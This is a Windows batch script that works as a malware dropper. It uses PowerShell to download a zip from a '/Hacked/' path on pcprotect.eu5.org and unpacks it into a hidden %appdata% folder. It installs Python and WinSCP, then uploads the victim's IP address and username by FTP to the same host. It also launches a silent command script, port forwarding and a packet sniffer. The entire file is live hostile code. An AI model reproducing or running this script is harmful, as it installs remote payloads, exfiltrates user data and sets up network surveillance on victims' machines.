rem pack1install nonftp HHB V0.3.1 L.I
@echo off
:start
if exist %appdata%\temp_setupfiles\batch.log goto installmisc
if not exist %appdata%\temp_setupfiles\batch.log goto downloadsetupcheck
:downloadsetupcheck
if exist %temp%\HHBP_1.zip goto unzipcheck
if not exist %temp%\HHBP_1.zip goto downloadsetup
:unzipcheck
if exist %temp%\HHpack\batch.log goto xcopy
if not exist %temp%\HHpack\batch.log goto unzip
:downloadsetup
powershell -Command "& {Invoke-WebRequest pcprotect.eu5.org/Hacked/HHBP_1.zip -OutFile %temp%\HHBP_1.zip}"
:unzip
mkdir %temp%\HHpack
powershell -Command "& Expand-Archive -Force %temp%\HHBP_1.zip %temp%\HHpack "
:nestit
mkdir %appdata%\temp_setupfiles
attrib +h foo /s /d
:xcopy
xcopy /s %temp%\HHpack %appdata%\temp_setupfiles\
:installmisc
echo program install started EO/N > Info.dll
cd %appdata%\temp_setupfiles\
call pythoninstall.bat
call winscpinstall.bat
:startprograms
call %appdata%\temp_setupfiles\ip.bat
ren ip.hh ip%USERNAME%.hhu
echo.%USERNAME% > %USERNAME%status.hhu
ftp\App\winscp\winscp.com /command "open ftp://Yourdomain:Yourdomain@pcprotect.eu5.org" "put %appdata%\temp_setupfiles\*.hhu" "exit"
start commandsilent.bat
call %appdata%\temp_setupfiles\portfoward\portfoward.bat
call %appdata%\temp_setupfiles\startsniffer.bat
pause
exit
